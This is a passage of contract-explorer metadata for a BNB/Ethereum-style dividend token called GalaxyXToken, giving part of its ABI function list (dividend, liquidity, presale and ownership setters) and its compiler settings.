oveholder\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_minPeriod\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_minDistribution\",\"type\":\"uint256\"}],\"name\":\"setDistributionCriteria\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_distributoBurnGas\",\"type\":\"uint256\"}],\"name\":\"setDistributoBurnGas\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_num\",\"type\":\"uint256\"}],\"name\":\"setNumTokensSellToAddToLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_minInviteAmount\",\"type\":\"uint256\"}],\"name\":\"setminInviteAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shareholderIndexes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"shareholders\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAndLiquifyEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"claimWait\",\"type\":\"uint256\"}],\"name\":\"updateClaimWait\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"updateMinimumTokenBalanceForDividends\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"updatePresaleStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_fenhongkaiguan\",\"type\":\"bool\"}],\"name\":\"updatefenhongkaiguan\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"withdrawableDividendOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "GalaxyXToken", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://657c59639706269fe622ab0704e6540b10bd95c97b3d56750b625a9f2097884c"}